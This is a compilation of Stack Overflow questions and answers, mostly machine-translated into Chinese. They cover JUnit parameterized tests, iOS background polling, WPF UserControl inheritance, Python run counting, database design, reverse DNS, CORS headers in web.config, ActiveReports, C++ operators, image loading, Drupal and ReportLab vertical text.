如果你真的每次都在做同样的事情，只是数据不同，然后看看[@Parameterized](http://kentbeck.github.com/junit/javadoc/latest/org/junit/runners/Parameterized.html)。

然后你可以有类似的东西（未经测试和未编译）：

```
@RunWith(Parameterized.class)
public class MyTestClass {
  @Parameters
  public static List<Object[]> data() {
      return Arrays.asList(new Object[][] {
          { "A", 1, "M", 1, "value1", "value2" },
          { "Q", 5, "Z", 10, "value3", "value4" },
      });
  }

  private String xValue;
  private int yValue;
  private String zValueString;
  private int zValueInt;
  private String expected1;
  private String expected2;

  public MyTestClass(String xValue, int yValue, String zValueString, int zValueInt, String expected1, String expected2) {
    this.xValue = xValue;
    this.yValue = yValue;
    this.zValueString = zValueString;
    this.zValueInt = zValueInt;
    this.expected1 = expected1;
    this.expected2 = expected2;
  }

  @Test
  public void test() {
    mockObjectX(xValue);
    mockObjectY(yValue);
    mockObjectZ(zValueString, zValueInt);

    myService.validate(expected1, expected2);
  }
} 
```

然后，您只需定义一次测试。

# ios - iOS 中的定时任务

> ID：13061517
> 
> 赞同：0
> 
> 时间：2012-10-25T04:19:35.753
> 
> 标签：ios

这个问题是我[之前的问题](https://stackoverflow.com/questions/12856572/push-notification-without-apns)（没有收到任何回复）的扩展/替代。与其尝试实现推送通知，我还可以定期轮询服务器。但是这个轮询需要在分配给后台任务的 10 分钟之后继续。

iOS中是否有类似定时任务的东西（想想cron-jobs / daemons）？

我能想到的另一种扭曲方式是，如果我在我的应用程序中集成 twitter 框架并让我的服务器发送直接消息，它会唤醒我的应用程序吗？我知道这听起来真的很蹩脚，因为如果通知被接收，iOS 将如何知道将通知发送到哪个应用程序......

谢谢并期待一些回复:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T04:26:55.457

为什么你反对使用推送通知来做任何你想做的事情？[Urban Airship](http://urbanairship.com/)似乎允许在其基本计划中每月免费发送 1000000 条推送消息。

反正我想不出别的办法了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T05:09:54.767

What you're trying to achieve is very likely a "no" but I did do some pretty some hackish stuff back then, so this may or may not work for you (no guarantee):

When an app receives a notification, it triggers the app delegate's applicationDidLoad() method and the notification object is stored in the "launchOptions" parameter.

In this method, you MAY be able to execute an action to poll your server.

So what I was thinking was, setup a local notification to fire at the date you desire. Local notification are like push notification, they can execute even if your app is terminated (killed from the background process)

Then in your app delegate's didFinishLaunchingOptions(), you can check to see if it's the matching notification, if yes, then execute your desire server polling logic, else ignore.

Note: if your server polling logic is in another view controller, do realise these view controllers may not actually be initiated until you actually click on the tab to view them. Now because your app is terminated and not running, you obviously can't tap on a tab.

The second hack is to call the getter "view" method of your view controller containing the server polling logic e.g:

```
// force iOS to initialize the view controller
[MyCustomVC view]; 
```

As you can see, very hackish and not recommended.

# c# - 使用从 UserControl 派生的类作为基础的 XAML 错误

> ID：13061519
> 
> 赞同：3
> 
> 时间：2012-10-25T04:19:41.070
> 
> 标签：c#, wpf, xaml

我正在使用 WPF，并且正在尝试使一个类继承自`UserControl`该类并将其用作其他类的基类。我已经阅读了很多关于如何做到这一点的文章（比如[这篇](https://stackoverflow.com/a/887527/726361)有超过 50 次投票的文章），但他们都说了同样的话，但都没有奏效。

我有这个代码：

```
namespace MyNamespace {
    // handwritten
    public class BaseControl : UserControl { }

    // generated by the IDE
    public partial class XAMLControl1 : UserControl {
        ...
    }
} 
```

现在，我将该行更改为

```
public partial class XAMLControl1 : BaseControl { 
```

在 XAML 中，我将其从

```
<UserControl x:Class="MyNamespace.XAMLControl1" ...>
    ...
</UserControl> 
```

到

```
<my:BaseControl x:Class="MyNamespace.XAMLControl1"
                xmlns:my="clr-namespace:MyNamespace" ...>
    ...
</my:BaseControl> 
```

该`my:BaseControl`部分以波浪形的蓝色下划线，所以当我将它悬停时，IntelliSense 说

> 名称“ `BaseControl`”中不存在名称空间“ `clr-namespace:MyNamespace`”。

编译器给了我奇怪的错误

> 1.  未找到元素“<m>”的结束标记。
>     
>     
> 2.  `m`找不到类型“ ”。确认您没有丢失程序集引用并且所有引用的程序集都已构建。
>     
>     
> 3.  名称“ `BaseControl`”中不存在名称空间“ `clr-namespace:MyNamespace`”。

是的，那是“`m`找不到类型''”。我没有看到我在哪里尝试使用在`m`任何地方命名的类型。我认为这是一个不相关的编译器错误，但我想我会提到它。而且我绝对确定该类型`BaseControl`确实存在于命名空间中`MyNamespace`。在我输入`my:`.

我能做些什么来解决这个问题？我正在使用 Visual Studio 2012 Express for Windows Desktop (7)。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T04:31:17.763

看来您必须使用自己的 BaseControl 使用单独的**dll**。当您启动您的**xaml**文件时，您将开始使用**my**命名空间，并稍后在您的 xaml.xml 中声明它。如果你想在声明之前使用**StaticResource也是一样的。**但是，当您将 BaseControl 分离到另一个项目以获取新的**dll**时，它将在使用之前进行编译。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-10-05T10:20:23.170

当我使用相同的编译器消息遇到相同的问题时，我发现了这个问题。也许我在讨论中遗漏了一些东西，但对我来说，解决方案是添加实现的 Dll 规范，例如：

```
xmlns:my="clr-namespace:MyNamespace;assembly=MyDll" 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-02-18T16:13:23.257

不需要单独的 dll，实际上真的很容易

```
namespace MyNameSpace.UserControls
{
      public class BaseControl : UserControl { //all the good common stuff... } 
} 
```

然后

```
namespace MyNameSpace.UserControls
{
      public sealed partial class DerivedControl: BaseControl { //your specific stuff... } 
} 
```

然后（对于 DerivedControl）

```
<local:BaseControl x:Class="MyNameSpace.UserControls.DerivedControl"
                                   xmlns:local="using:MyNameSpace.UserControls" 
```

（注意，这是针对***没有匹配 xaml***文件的基类）

请参阅[如何在 .xaml 文件中指定不同的基类 (Silverlight)？](https://stackoverflow.com/questions/1297433/how-do-you-specify-a-different-base-class-in-xaml-files-silverlight)

# python - 在 Python 中，如何有条件地增加计数？

> ID：13061520
> 
> 赞同：1
> 
> 时间：2012-10-25T04:19:49.727
> 
> 标签：python, increment

说我有清单：

```
list = [a,a,b,b,b] 
```

我正在遍历列表。当前一个字母与当前字母相同时，变量“count”加 1。以下只是部分代码：

```
for item in list:
    if item == previous:
        count +=1
return count 
```

上面的示例返回 3，1 代表重复 a，2 代表 bs。我可以用什么来使它计数只增加一次，总共 2？我尝试使用一个变量“found”，它根据之前是否见过这个字母而返回 True 或 False，但这当然不适用于 [a,a,a,c,a,a,a] 之类的东西，如我所愿，它为“a”的第一次运行返回 1 而不是 2。

编辑：我可能比它需要的更难。我想要的只是在任何时候连续重复一个字符串以使计数增加一。[a,b,b,c,a,a,a,a,c,c,c,] 应该返回 3。 [a,a,a,a,a,a,a,a] 应该返回 1。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T05:28:20.220

I hope this works for you.

```
a = ['a', 'b', 'b', 'c', 'a', 'a', 'a', 'a', 'c', 'c', 'c']
previo = None
counter = 0
temp_l, checked = [], []
for item in a:
    if item != previo:
        temp_l = []

    if not temp_l or item == previo:
        temp_l.append(item)
        previo = item

    if len(temp_l) >= 2 and item not in checked:
        counter += 1
        checked.append(item)

    previo = item

print counter 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T04:43:23.077

疯狂的猜测：既然你想`a,a,b,b,b`成为 2 而不是 3，而且你还想`a,a,a,c,a,a,a`给两个，我认为你正在尝试计算长度 >= 2 的相等元素的不同连续组。如果是这样，你可以使用`itertools.groupby`：

```
>>> import itertools
>>> seq1 = ['a','a','b','b','b']
>>> [(k, list(g)) for k,g in itertools.groupby(seq1)]
[('a', ['a', 'a']), ('b', ['b', 'b', 'b'])]
>>> seq2 = ['a','a','a','c','a','a','a']
>>> [(k, list(g)) for k,g in itertools.groupby(seq2)]
[('a', ['a', 'a', 'a']), ('c', ['c']), ('a', ['a', 'a', 'a'])] 
```

因此

```
>>> sum(len(list(g)) >= 2 for k,g in itertools.groupby(seq1))
2
>>> sum(len(list(g)) >= 2 for k,g in itertools.groupby(seq2))
2 
```

但这只是一个猜测。这是我能想到的唯一与您给出的仅有的两个数据点匹配的东西，至少假设我正确地解释了“第一次运行“a”而不是 2 的“1”。这使得您不清楚您是希望总数为 2 还是第一次运行“a”的贡献为 2。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T04:56:15.387

```
def max_contiguous_repeat(data):
   max_repeats = 0
   if data:
      previous = data[0]
      count = 0
      for item in data[1:]:
         if item == previous:
            count += 1
            continue
         max_repeats = max(count, max_repeats)
         previous = item
         count = 0
      max_repeats = max(count, max_repeats)
   return max_repeats 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-25T05:59:53.590

```
import collections
defaultdict=collections.defaultdict
def get_count(string):
    d=defaultdict(int)
    for k in string:
        d[k]+=1
    return max(d.items(),key=lambda a:a[1]) 
```

像这样的东西可以工作，你可以像这样使用它：

```
common_character,occurances=get_count("aaaaabbbbbcccdddd") 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-25T04:39:51.987

如果我正确理解您的问题，您只想计算列表中连续至少重复两次的字母数？您可以存储找到的字母列表。像这样的东西应该可以完成你所需要的：

```
l = ['a', 'a', 'b', 'b', 'b']
repeated = []
previous = None
count = 0
for item in l:
    if item == previous and item not in repeated:
        count += 1
        repeated.append(item)
    else:
        repeated = []
    previous = item
return count 
```

请注意，DSM 已经发布了一种更类似于 python 的方式来实现这一点。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-10-25T04:23:34.090

我不确定你想要这个产生什么，但无论哪种方式，你的代码都丢失了很多。

```
my_list = ['a', 'a', 'b', 'b', 'b']
previous = None
count = 1
for item in my_list:
    if item == previous:
        count += 1
    else:
        count = 1
    previous = item
print count 
```

*   首先，`a`and`b`是变量.... `'a'`and`'b'`是字符串。
*   接下来，您从未初始化`previous`和`count`.
*   接下来，您使用`=`的是（这是分配）而不是`==`用于比较。
*   接下来，`count`如果两者不相等，您就不会重置。
*   最后，您没有设置`previous`每次`item`迭代。

此代码产生`3`，因为末尾有 3 个 b。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2015-10-09T20:07:19.887

我不确定我是否清楚地理解了这个问题，而且它现在已经很老了，但它的价值是你想要的（唯一值的数量）？

```
>>> some_list = ['a', 'a', 'b', 'b', 'b']
>>> len(set(some_list))
2 
```

另请参阅[https://docs.python.org/2/tutorial/datastructures.html#sets](https://docs.python.org/2/tutorial/datastructures.html#sets)。

# mysql - 电子商务数据库设计

> ID：13061522
> 
> 赞同：1
> 
> 时间：2012-10-25T04:19:54.387
> 
> 标签：mysql, database, database-design

我目前正在开发一个可以容纳大量项目的数据库，并且想知道如果每个类别有 1000 到 10,000 个项目，哪种设计会更好。

数据库设计#1

```
Login Details
--------------
-userID
-Username
-Password
- ETC....

User Settings
--------------
-userID
-Setting 1
-Setting 2
-Setting 3
- ETC....

Product Category
-----------------
-ID
-Name

ALL Items
-----------
-ItemID
-Name
-Description
-Price
-Info
- ETC....
-parentCategoryID 
```

或者

数据库设计#2

```
Login Details
--------------
-userID
-Username
-Password
- ETC....

User Settings
--------------
-userID
-Setting 1
-Setting 2
-Setting 3
- ETC....

Product Category
-----------------
-ID
-Name
-tableName

Electronics
-------------
-ItemID
-Name
-Desc.
-Price
- ETC....

Food
-------------
-ItemID
-Name
-Desc.
-Price
- ETC....

Books
-------------
-ItemID
-Name
-Desc.
-Price
- ETC....

Apparel
-------------
-ItemID
-Name
-Desc.
-Price
- ETC....

Others
-------------
-ItemID
-Name
-Desc.
-Price
- ETC.... 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T06:23:39.670

选项1将是要走的路。

如果您使用选项 2，则每次您希望查询数据库以了解不同的产品类型时都必须使用不同的查询，因为您将在不同的*表*中存储不同的产品类型。

与存储产品相比，存储用户的问题要少得多。由于价格会随时间而变化，最好从“产品”表中删除“价格”字段并将其存储在另一个表“价格表”中，其字段为产品、价格、起始日期（可能还有截止日期） .

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T04:32:46.033

对于选项 2，如果您要依赖字符串来标识表，则您没有参照完整性。

在我看来，选项 1 是实践良好（规范化）的做事方式。此外，即使每个类别保存 10000 行，对于现代数据库来说也不是什么大问题。

# email - 如果我将多个 DNS 指向服务器 IP，如何添加 RDNS？

> ID：13061523
> 
> 赞同：1
> 
> 时间：2012-10-25T04:20:05.933
> 
> 标签：email, reverse-dns

我在单个服务器中托管了 2 个电子邮件服务器。此服务器只有一个公共 IP。

我有 2 个域名，比如 mail.aaa.com 和 mail.bbb.com，它们指向这个服务器，比如 1.2.3.4。

我的互联网服务提供商不允许为单个 IP 添加多个 RDNS。所以我应该为这个问题做些什么？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-27T11:03:34.370

为您的服务器定义一个主机名并将该主机名放入服务器 SMTP HELO 及其 RDNS 记录中，同时确保该主机名在您的公共 ip 中有一条 A 记录。该主机名是否在托管邮件域之一中并不重要，但它可以。

例子：

*   托管域：aaa.com、bbb.com
*   服务器 HELO：mail.example.org
*   域名解析：
    *   mail.example.org A 1.2.3.4
    *   4.3.2.1.in-addr.arpa PTR mail.example.org

（而不是“example.org”，您可以使用您的托管域之一，例如 HELO/A/rDNS mail.aaa.com）

# asp.net - 如何在特定文件 web.config 上设置访问控制允许来源

> ID：13061524
> 
> 赞同：25
> 
> 时间：2012-10-25T04:20:06.803
> 
> 标签：asp.net, .net, iis, config

如果这是一个动态响应，我会这样做，`Response.Headers.Add("Access-Control-Allow-Origin", "*");`但我有一个静态文件，我想允许跨域访问。

有没有办法仅使用 web.config 将此标头分配给特定文件？说它只是 example.com/flat.json

我想我可以将文件路由到动态页面，但这有点傻。

* * *

## 回答 #1

> 赞同：58
> 
> 时间：2012-10-25T04:29:40.323

这应该工作

```
<location path="Sample.txt">
    <system.webServer>
      <httpProtocol>
        <customHeaders>
          <add name="Access-Control-Allow-Origin" value="*" />
        </customHeaders>
      </httpProtocol>
    </system.webServer>
  </location> 
```

# .net - 如何仅在每个对象的第一页上显示 PageFooter？

> ID：13061534
> 
> 赞同：1
> 
> 时间：2012-10-25T04:23:18.873
> 
> 标签：.net, activereports

我正在修改一个绑定到对象列表的 ActiveReports（用于 .NET v.2 SP3 Build 4.3.0.1261）报告。详细信息部分设置有两个分页符，因此为每个对象生成（最多）3 页。

我说“最多”是因为第 2 页和第 3 页与每个对象都不相关，因此某些对象只会生成一页。当只有第一页相关时，我通过禁用分页符并降低详细信息高度从 Detail_Format 事件中实现这一点。

我的问题是我试图仅在每个对象的第一页上显示页脚，即为第 2 页和第 3 页隐藏它，但我找不到这样做的方法。我不能只跟踪页数，因为每个对象的页数是可变的。

关于如何实现这一点的任何想法，即使这意味着使用细节布局的不同方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T05:10:31.067

在射击了很多事件处理程序之后，我设法弄明白了。

放入`PageFooter.Visible = True`事件处理`Detail.Format`程序，并放入`PageFooter.Visible = False`事件处理`Report.PageStart`程序。

如果有人感兴趣，我之前的问题是由于尝试在事件处理程序中将计数器设置为零`Detail.Format`并将其递增事件处理程序`Report.PageStart`，然后在计数器大于零时使页脚不可见而引起的。但由于事件的时间安排，这意味着

*   第 1 页有页脚
*   第 2 页有页脚
*   第 3 页没有页脚
*   下一个对象的第 1 页没有页脚

# c++ - 类中的运算符重载，导致范围错误

> ID：13061537
> 
> 赞同：2
> 
> 时间：2012-10-25T04:23:37.767
> 
> 标签：c++, class, operator-overloading, complex-numbers

我正在尝试创建一个类以重载`+`, `-`, `*`, `/`, `<<`, `>>`, 并`==`为复数工作。在尝试进行故障排除时，我收到多条错误消息：

```
error: ‘double complexType::imaginaryPart’ is private 
```

我的头文件是

```
#ifndef COMPLEXTYPE_H
#define COMPLEXTYPE_H
#include <iostream>
#include <cmath>
#include <fstream>

class complexType
  {
    friend ostream& operator << (ostream &os, const complexType &a)
    friend istream& operator >> (istream &is, const complexType &a)
   public:
     complexType();
     complexType(double real, double imag );
     void getComplexType(double&, double&);
     void setComplextType(const double&, const double&);
     friend bool operator == (const complexType &otherComplex) const;
     friend complexType operator + (const complexType &, const complexType &);
     friend complexType operator - (const complexType &, const complexType &);
     friend complexType operator * (const complexType &, const complexType &);
     friend complexType operator / (const complexType &, const complexType &);
    private:
     double realPart; //Variable to store the real part
     double imaginaryPart; //Variable to store the private part
};
#endif // COMPLEXTYPE_H 
```

我的实现文件是

```
 #include "complexType.h"

   complexType::complexType()
   {
     realPart = 0.0;
     imaginaryPart = 0.0;
   }

   complexType::complexType(double r, double i)
   {
      realPart = r;
      imaginaryPart = i;
   }

   void setComplextType(double r, double i)
   {
     realPart = r;
     imaginaryPart = i;
   } 

   bool operator == (const complexType &a, const complexType &b)
   {
     return (a.realPart == b.realPart && a.imaginaryPart == b.imaginaryPart);
   }

     operator + (const complexType &a, const complexType &b) 
   {
     complexType temp;
     temp.realPart = a.realPart + b.realPart;
     temp.imaginaryPart = a.imaginaryPart + b.imaginaryPart;
     return temp;
    }

     operator - (const complexType &a, const complexType &b)
     {
        complexType temp;
        temp.realPart = a.realPart - b.realPart;
        temp.imaginaryPart = a.imaginaryPart - b.imaginaryPart;
        return temp;
     }

     operator * (const complexType &a, const complexType &b)
     {
        complexType temp;
        temp.realPart = a.realPart * b.realPart - a.imaginaryPart * b.imaginaryPart;
        temp.imaginaryPart = a.realPart * b.imaginaryPart + a.imaginaryPart *            b.realpart;
       return temp;
       }

       operator / (const complexType &a, const complexType &b)
      {
       complexType temp;
        temp.realPart = (a.realPart * b.realPart + a.imaginaryPart * b.imaginaryPart) /           (pow(b.realPart,2) + pow(b.imaginaryPart,2));
          temp.imaginaryPart = (-a.realPart * b.imaginaryPart +                      a.imaginaryPart*b.realPart) / (pow(b.realPart,2) + pow(b.imaginaryPart,2));
        return temp;
       }

       ostream & operator << (ostream &os, const complexType &a)
       {
         os << "(" << a.realPart << " ," << a.imaginaryPart << "i)";
         return os;
       }

         istream & operator >> (istream &is, const complexType &a)
        {
        char ch, ch2, ch3;
        is >> ch;
        is >> a.realPart;
        is >> ch2;
        is >> a.imaginaryPart;
        is >> ch3;
        return is;
        } 
```

对于代码和格式方面的任何帮助，我将不胜感激，因为这是我的第一个问题。提前致谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-25T04:31:00.660

您忘记在运算符定义前加上返回类型 ( `complexType`)。所以返回类型默认为`int`并且不匹配朋友声明。

此外，您的定义`setComplextType`没有类前缀 ( `complexType::`) 并且具有错误的参数类型，但这不应导致您看到的错误消息。

# javascript - 将图像动态加载到 Div

> ID：13061539
> 
> 赞同：3
> 
> 时间：2012-10-25T04:23:45.397
> 
> 标签：javascript, css, html, dynamic

我有一个个人资料图像列表，它们出现在最初通过 CSS 隐藏的“菜单下拉”div 中。我想在选择每个菜单项时动态加载这些图像（作为列表），以减少页面加载时间。这怎么可能？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T04:48:33.257

尝试使用：

```
$("#divID").html("<img  style='position:absolute' src='path/to/the/ajax_loader.gif'>"); 
```

如果你使用 ajax：

```
 function sendAjax()
    {
        $("#divID").html("<img  style='position:absolute' src='path/to/the/ajax_loader.gif'>");

         // you ajax code

        $("#divID").html(ajaxResponse);
    } 
```

您也可以使用`document.getElementById('divID').innerHTML`代替`$("#divID").html()`. 它也可以正常工作

如果你使用这个方法，不需要使用css隐藏div。它在 ajax 响应后自动删除。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T06:58:26.360

好吧，你可以试试这个：

```
<div id="desiredDiv">
</div>
<script>
var images = [
    'http://www.example.com/img/image1.png',
    'http://www.example.com/img/image2.png',
    'http://www.example.com/img/image3.png',
    ...
];
for(var i=0; i<images.length; i++) {
    $('#desiredDiv').append('<img src="'+images[i]+'" alt="" />');
}
</script> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T04:33:24.453

在您的 HTML 中，省略每个图像标签上的 src 属性。相反，添加一个名为 data-src 的属性并为其提供图像 url。

然后，当显示菜单时，运行以下脚本：

```
$('.menu-class img').each(function() {
    $(this).attr('src', $(this).data('src'));
}); 
```

如果您还没有，则所述脚本需要 jquery

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-25T04:50:40.960

您可以将图像列表保存在 JavaScript 变量中：

```
var images = [
    'http://www.example.com/img/image1.png',
    'http://www.example.com/img/image2.png',
    'http://www.example.com/img/image3.png',
    ...
]; 
```

然后，您可以通过创建图像标签在需要时加载图像：

```
var i = 0; // the index of the image in the list
var $img = $( '<img>' ).attr({'src':images[i]}); 
```

只需将图像附加到您的 div，它就会被浏览器自动加载。

# drupal - 如何从 hook_form_alter 访问节点/内容变量

> ID：13061542
> 
> 赞同：0
> 
> 时间：2012-10-25T04:24:46.640
> 
> 标签：drupal, drupal-6

我有一个 cck 字段，我需要在我的 hook_form_alter 中访问它，所以我可以使用动态值设置某个字段的默认值。

显然， node_load 不适合我。

```
 if ($form_id == 'some_form_id') {
    $node = node_load($item->nid); 
    $somevariable = $node->field_cck_foo[0]['value'] * 2;
    $form ['xxx']['xxx']['#default_value'] = $somevariable; 
} 
```

我如何能够访问节点项目，以便我可以在 hook_form_alter 中使用它？请指教。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T18:25:17.520

node_load() 将为您获取所有 CCK 字段值，尝试执行 var_dump 以查看发生了什么。

如果 node_load() 没有带来完整的节点结构，请尝试使用此解决方法清除缓存[http://drupal.org/node/158237#comment-4593950](http://drupal.org/node/158237#comment-4593950)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-04-23T07:20:11.973

对于 D7：

```
$arg = arg();
if($arg[0] == 'node' && !empty($arg[1])) {
    $node = node_load(arg(1));
} 
```

# python - 使用 ReportLab 旋转文档（垂直文本）

> ID：13061545
> 
> 赞同：7
> 
> 时间：2012-10-25T04:25:24.613
> 
> 标签：python, reportlab

我试图获得类似以下片段的内容，以实际绘制旋转 90 度的文档。页面大小最终已经是我想要的方式，但文本仍然是水平的。如何旋转文本使其垂直？

```
style = getSampleStyleSheet()
normal = style["Normal"]
normal.alignment = TA_CENTER
normal.fontName = "Helvetica"
normal.fontSize = 15

pdf = SimpleDocTemplate("testplatypus.pdf", pagesize = (80, 250), rightMargin=10, leftMargin=10, topMargin=20,bottomMargin=20)
story = []
text = "I really need this to be wrapped and vertical!"

para = Paragraph(text, normal)
story.append(para)
pdf.build(story) 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2016-10-31T19:15:46.503

这是这个问题的最高谷歌结果，所以我想我会发布一个更好的解决方案。我的答案直接来自[这里](http://two.pairlist.net/pipermail/reportlab-users/2009-April/008171.html "这里")

如果您使用的是 doc 模板，则可以使用非常轻量级的 Flowable，它将在特定的表格单元格中创建垂直文本。

```
# rotatedtext.py
from reportlab.platypus.flowables import Flowable

class verticalText(Flowable):

'''Rotates a text in a table cell.'''

def __init__(self, text):
    Flowable.__init__(self)
    self.text = text

def draw(self):
    canvas = self.canv
    canvas.rotate(90)
    fs = canvas._fontsize
    canvas.translate(1, -fs/1.2)  # canvas._leading?
    canvas.drawString(0, 0, self.text)

def wrap(self, aW, aH):
    canv = self.canv
    fn, fs = canv._fontname, canv._fontsize
    return canv._leading, 1 + canv.stringWidth(self.text, fn, fs) 
```

然后在文档中使用它：

```
# vertical_text_table.py
from reportlab.pdfbase import pdfmetrics
from reportlab.pdfbase.ttfonts import TTFont
from reportlab.lib import colors
from reportlab.lib.colors import HexColor
from reportlab.lib.pagesizes import letter
from reportlab.lib.styles import getSampleStyleSheet
from reportlab.lib.units import inch
from reportlab.platypus import (
      BaseDocTemplate, Frame, Paragraph, NextPageTemplate,
      PageBreak, PageTemplate, Image, Table, TableStyle, Spacer)
from rotatedtext import verticalText

document = BaseDocTemplate(
    'Vertical.pdf')

Elements = []

titleFrame_1 = Frame(
    0.5*inch, 0.75*inch, 7*inch, 9*inch, id='col1', showBoundary=0)
titleTemplate_1 = PageTemplate(
    id='OneCol', frames=titleFrame_1)
document.addPageTemplates([titleTemplate_1])

cw = [1.2*inch] + [1*inch]*6
rh = [0.25*inch] + [.6*inch] + [0.25*inch]*7

data = [
    ['Some', 'Reporting', '', 'Data', '', 'Here', ''],
    ['', verticalText('Vertical'), verticalText('Text'),
        verticalText('Vertical'), verticalText('Text'),
        verticalText('Vertical'), verticalText('Text')],
    ['Row1', '0', '0', '69', '803', '20751', '11627'],
    ['Row2', '0', '0', '1', '0', '1096', '103'],
    ['Row3', '0', '0', '0', '0', '233', '1'],
    ['Row4', '0', '0', '0', '0', '694', '38'],
    ['Row5', '0', '0', '23', '2', '1319', '2'],
    ['Row6', '0', '0', '0', '0', '0', '0'],
    ['TOTAL', '0', '0', '93', '805', '24093', '11771'],
    ]

ts = [
    ('GRID', (0, 0), (-1, -1), 0.5, colors.black),
    ('SPAN', (1, 0), (2, 0)),
    ('SPAN', (3, 0), (4, 0)),
    ('SPAN', (5, 0), (6, 0)),
    ('SPAN', (0, 0), (0, 1)),
    ('ALIGN', (0, 0), (-1, 1), 'CENTER'),
    ('ALIGN', (0, 2), (-1, -1), 'RIGHT'),
    ('VALIGN', (0, 0), (-1, -2), 'MIDDLE'),
    ('FONT', (0, 0), (-1, 1), 'Helvetica-Bold', 7, 7),
    ('FONT', (0, 2), (0, -2), 'Helvetica-Bold', 7, 7),
    ('FONT', (1, 2), (-1, -2), 'Helvetica', 7, 7),
    ('FONT', (0, -1), (-1, -1), 'Helvetica-Bold', 8, 8),
    ('TEXTCOLOR', (0, -1), (-1, -1), colors.white),
    ('BACKGROUND', (0, -1), (-1, -1), colors.black),
]

t = Table(
    data, style=ts,
    colWidths=cw, rowHeights=rh)

Elements.append(t)
document.build(Elements) 
```

这使：

[![带有垂直文本的表格。](../Images/cb5a4f1f8df974a3033ee6f740b41a7d.png)](https://i.stack.imgur.com/k0rkF.jpg)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2019-01-17T03:32:38.967

我找到了一个简单的方法来解决这个 USING canvas.drawString()。它在一个常规的 python 函数中。下面示例中的“WHATEVER TEXT”将在您的 pdf 上垂直渲染文本。阅读代码中的注释以充分了解如何实现这一点。

```
def lista_privados(request, pk):
    g1 = get_object_or_404(Grupo, pk=pk)
    response = HttpResponse(content_type='application/pdf')
    response['Content-Disposition'] = 'attachment; filename="{}"'.format(g1)
    buffer = BytesIO()
    c = canvas.Canvas(buffer, pagesize=A4)
    c.setPageSize(landscape(letter))

    #Whatever your other code is 
```

重要的是它只在最后，在你的 showPage() 之前有效

```
 c.rotate(90)
    c.drawString(16*cm, -14*cm, "WHATEVER TEXT 1")
    c.drawString(16*cm, -14.4*cm, "WHATEVER TEXT 2")
            #c.drawString(x*cm, y*cm, "TEXT YOU WANT TO DISPLAY VERICALLY")
            #Note the '-' is VERY IMPORTANT OR IT WON'T WORK
            #ONLY WRITE THE c.rotate(90) one, you can list as many 'c.drawString(16*cm, -14*cm, "WHATEVER TEXT")' as you wish
            #The font size will be the last one you set on your code, so if for example you do "c.setFont('Helvetica', 5)" just the "c.rotate(90)", "WHATEVER TEXT" will be Helvetica, 5.

    c.showPage() #save page

    c.save()
    pdf = buffer.getvalue()
    buffer.close()
    response.write(pdf)
    template = 'privados/imp_list.html'
    return response 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-26T12:54:29.723

也许您可以通过添加构建方法来做到这一点。

就是这样。

```
pdf = SimpleDocTemplate("testplatypus.pdf", pagesize = (80, 250), rightMargin=10,  leftMargin=10, topMargin=20,bottomMargin=20)
pdf.build(Story, onFirstPage = myFirstPage, onLaterPages=myLaterPages)

def myFirstPage(canvas, doc):
            canvas.saveState()
            canvas.rotate(90)
            canvas.restoreState()

def myLaterPages(canvas, doc):
            canvas.saveState()
            canvas.rotate(90)
            canvas.restoreState() 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2021-04-30T20:24:39.523

受 KJYDavis 发布的解决方案的启发，我制作了一个 VerticalParagraph，以便它支持段落所具有的样式功能，例如 ParaghaphStyle、XML 标记标签和段落内标记（[Reportlab 文档第 6 章](https://www.reportlab.com/docs/reportlab-userguide.pdf)）

```
from reportlab.platypus import Paragraph

class VerticalParagraph(Paragraph):
"""Paragraph that is printed vertically"""

    def __init__(self, args, **kwargs):
        super().__init__(args, **kwargs)
        self.horizontal_position = -self.style.leading

    def draw(self):
        """ Draw text """
        canvas = self.canv
        canvas.rotate(90)
        canvas.translate(1, self.horizontal_position)
        super().draw()

    def wrap(self, available_width, _):
        """ Wrap text in table """
        string_width = self.canv.stringWidth(
            self.getPlainText(), self.style.fontName, self.style.fontSize
        )
        self.horizontal_position = - (available_width + self.style.leading) / 2
        height, _ = super().wrap(availWidth=1 + string_width, availHeight=available_width)
        return self.style.leading, height 
```

它可以像使用 Paragraph flowable 一样使用，尽管我只在表格中尝试过。

```
stylesheet = getSampleStyleSheet()
text = VerticalParagraph('<para align="CENTER">Some <b>BOLD</b> <i>Text</i></para>', stylesheet['BodyText']) 
```

另一个好处是这个版本不需要直接访问 Canvas 的私有成员，例如`_fontname`,`_fontsize`或`_leading`，如果您的项目使用 pylint 或类似的东西，这很好。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2019-01-17T03:25:58.807

如果您想将水平文本转换为垂直文本，我找到了一种简单直接的方法。

```
def your_function_name(request, pk):
    g1 = get_object_or_404(Grupo, pk=pk)
    response = HttpResponse(content_type='application/pdf')
    response['Content-Disposition'] = 'attachment; filename=Plista2.pdf'
    buffer = BytesIO()
    c = canvas.Canvas(buffer, pagesize=A4)
c.setPageSize(landscape(letter)) 
```

